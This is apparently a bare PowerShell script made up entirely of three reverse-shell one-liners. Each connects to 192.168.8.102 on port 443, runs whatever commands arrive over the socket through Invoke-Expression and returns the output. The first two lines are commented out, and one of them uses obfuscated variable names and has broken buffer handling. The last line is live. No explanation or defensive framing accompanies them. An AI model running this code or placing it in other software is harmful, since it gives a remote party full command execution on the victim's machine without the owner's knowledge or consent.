#while($true){$cldiidokokokd=New-Object System.Net.Sockets.TCPClient('192.168.8.102',443);$iizodkzidjfuufhydz=$cldiidokokokd.GetStream();[byte[]]$xiitcvtzdccttztv= 0..65535|%{0};while(($i = $iizodkzidjfuufhydz.Read($xiitcvtzdccttztv, 0, $xiitcvtzdccttztv.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + '#' + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$iizodkzidjfuufhydz.Write($sendbyte,0,$sendbyte.Length);$iizodkzidjfuufhydz.Flush()};$cldiidokokokd.Close();}
#while($true){$client = New-Object System.Net.Sockets.TCPClient('192.168.8.102',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '#>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"}
$LHOST = "192.168.8.102"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
